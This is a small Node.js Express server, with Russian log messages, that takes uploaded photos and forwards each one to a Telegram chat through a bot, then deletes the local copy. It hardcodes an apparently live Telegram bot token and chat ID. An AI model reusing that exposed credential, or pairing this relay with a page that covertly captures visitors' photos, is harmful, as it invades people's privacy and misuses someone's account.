const express = require('express');
const multer = require('multer');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');

const app = express();
const upload = multer({ dest: 'uploads/' });

const TELEGRAM_TOKEN = '7807639745:AAFFeZ5YB5wEYRRfKsCyXFti9uxAP9elpq0';
const CHAT_ID = '8009046486';

app.use(express.static('public'));

app.post('/send-photo', upload.single('photo'), async (req, res) => {
  const photoPath = req.file.path;

  try {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', fs.createReadStream(photoPath));

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, form, {
      headers: form.getHeaders(),
    });

    res.sendStatus(200);
  } catch (err) {
    console.error('Ошибка при отправке в Telegram:', err.message);
    res.sendStatus(500);
  } finally {
    fs.unlink(photoPath, () => {});
  }
});

app.listen(3000, () => {
  console.log('Сервер запущен на http://localhost:3000');
});
